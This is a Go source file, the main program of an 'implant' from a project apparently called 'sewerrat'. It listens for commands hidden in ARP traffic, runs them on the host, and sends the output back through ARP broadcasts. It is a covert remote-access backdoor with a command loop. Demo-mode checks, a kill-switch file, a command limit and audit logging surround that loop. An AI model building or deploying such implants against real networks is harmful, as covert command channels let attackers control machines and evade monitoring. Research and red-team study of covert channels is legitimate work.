package main

import (
	"log"
	"os"
	"os/signal"
	"syscall"

	"sewerrat/implant"
	"sewerrat/shared"
)

func main() {
	logPath, err := shared.SetupAuditLogger("implant")
	if err != nil {
		log.Fatalf("[!] failed to configure implant audit logging: %v\n", err)
	}
	if err := shared.EnsureDemoMode("implant"); err != nil {
		log.Fatalf("[!] %v\n", err)
	}

	stopPath, enabled, err := shared.KillSwitchPresent()
	if err != nil {
		log.Fatalf("[!] failed to inspect local kill switch: %v\n", err)
	}
	if enabled {
		log.Fatalf("[!] kill switch already present at %s\n", stopPath)
	}

	maxCommands := shared.MaxDemoCommands()
	log.Printf("[AUDIT] implant demo mode enabled; audit_log=%s stop_file=%s max_commands=%d pid=%d\n", logPath, stopPath, maxCommands, os.Getpid())

	// Step 1: Find active network interface
	iface, err := implant.FindActiveInterface()
	if err != nil {
		log.Fatalf("[!] %v\n", err)
	}
	log.Printf("[*] Found interface: %s (%s)\n", iface.Name, iface.HardwareAddr)

	// Step 2: Create ARP sniffer
	sniffer, err := implant.NewARPSniffer(iface)
	if err != nil {
		log.Fatalf("[!] Failed to create sniffer: %v\n", err)
	}
	defer sniffer.Stop()

	// Step 3: Create broadcaster for responses
	broadcaster := implant.NewARPBroadcaster(iface)
	broadcaster.Handle, err = iface.GetDeviceHandle()
	if err != nil {
		log.Fatalf("[!] Failed to create response handle: %v\n", err)
	}
	defer broadcaster.Close()

	// Step 4: Create executor for commands
	executor := implant.NewCommandExecutor(shared.CommandTimeout)

	// Step 5: Start sniffer in background
	if err := sniffer.StartAsync(); err != nil {
		log.Fatalf("[!] Failed to start sniffer: %v\n", err)
	}

	log.Printf("[+] Beacon active on %s\n", iface.IP)

	// Step 6: Send initial beacon (optional, for testing)
	_ = broadcaster.SendBeacon()

	// Step 7: Main command loop - listen for commands and execute
	commandCh := sniffer.GetCommandChannel()
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	executedCommands := 0

	for {
		select {
		case command, ok := <-commandCh:
			if !ok {
				log.Printf("[AUDIT] sniffer command channel closed; exiting\n")
				return
			}

			stopPath, enabled, err := shared.KillSwitchPresent()
			if err != nil {
				log.Printf("[AUDIT] failed to inspect kill switch: %v\n", err)
			}
			if enabled {
				log.Printf("[AUDIT] kill switch detected at %s; shutting down before execution\n", stopPath)
				return
			}
			if executedCommands >= maxCommands {
				log.Printf("[AUDIT] max demo command budget reached (%d); exiting\n", maxCommands)
				return
			}

			// Execute command
			log.Printf("[AUDIT] executing allowed command #%d: %s\n", executedCommands+1, shared.SummarizeForAudit(command, shared.AuditPreviewLimit))
			output, err := executor.Execute(command)
			if err != nil {
				log.Printf("[AUDIT] command execution rejected or failed: %v\n", err)
				output = "[ERROR] " + err.Error()
			} else {
				log.Printf("[AUDIT] %s\n", implant.GetCommandExecutionSummary(command, output))
			}

			// Send response via ARP
			if err := broadcaster.SendResponse(output); err != nil {
				log.Printf("[AUDIT] failed to send response: %v\n", err)
			}
			executedCommands++

		case <-sigCh:
			// Graceful shutdown on Ctrl+C or SIGTERM
			log.Printf("[AUDIT] received shutdown signal; exiting\n")
			return
		}
	}
}
